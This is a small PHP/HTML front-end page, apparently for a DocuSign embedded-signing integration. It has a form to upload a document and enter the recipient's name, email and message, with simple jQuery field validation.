<html>
<head>
<title>DocuSign</title>
<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700,800" rel="stylesheet">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<style type="text/css">
body{font-family: 'Open Sans', sans-serif;font-size:16px;background-color:#555050}
#mydiv {
    position:fixed;
    top: 40%;
    left: 50%;
    width:30em;
    height:26em;
    margin-top: -9em; 
    margin-left: -15em;
    border: 1px solid #ccc;
    background-color: #f3f3f3;
}
#mydiv > form > span {
	
	margin-left : 40px;
}
#mydiv form{padding:0 30px;text-align:center}
#mydiv input,textarea{width: 100%;height: 33px;padding: 0 10px;border-radius: 3px;border: 1px solid #999;margin-bottom: 20px;}
#mydiv input.file{border:none}
#mydiv input.sub-btn{width:auto;border:none;background-color:#f58220} 
</style>
</head>
<body>
<div id="mydiv"><h2 style="color:#f58220;margin-left: 100px;">Upload Document to Sign</h2>

 <form method="post" id="docuForm" action="embeddedsign.php" onsubmit="return validateForm()" enctype="multipart/form-data">
 <?php session_start();
if(isset($_SESSION['succMsg'])){ 
echo '<span><h5 style="color:green">'.$_SESSION['succMsg'].'<h5></span>'; 
unset($_SESSION['succMsg']);}
?>
  <input type="text" name="recipientName" id="recipientName" placeholder="Recipient Name"/></br>
  <input type="email" name="recipientEmail" id="recipientEmail" placeholder="Recipient Email"/></br>
  <textarea name="docMessage" id="docMessage" placeholder="Document attached Message.." style="height:60px"></textarea></br>
  <input type="file" name="file" class="file"/>
  <input type="submit" name="submit_file" value="Submit" class="sub-btn"/>
 </form>

</div>
</body>
<script>
function validateForm(){
	
	var recipientName = $('#recipientName').val();
	var recipientEmail = $('#recipientEmail').val();
	var docMessage = $('#docMessage').val();
	var flag = 0;
	
	if(recipientName == ""){
		alert('please enter recipient name .');
		flag = 1;
	}
	
	if(recipientEmail == ""){
		alert('please enter recipient email .');
		flag = 1;
	}
	
	if(docMessage == ""){
		alert('please write document attached message . ');
		flag = 1;
	}
	
	if(flag == 0){
		$('#docuForm').submit();
	}
	else {
		
		return false;
	}
	
	
}
</script>
</html>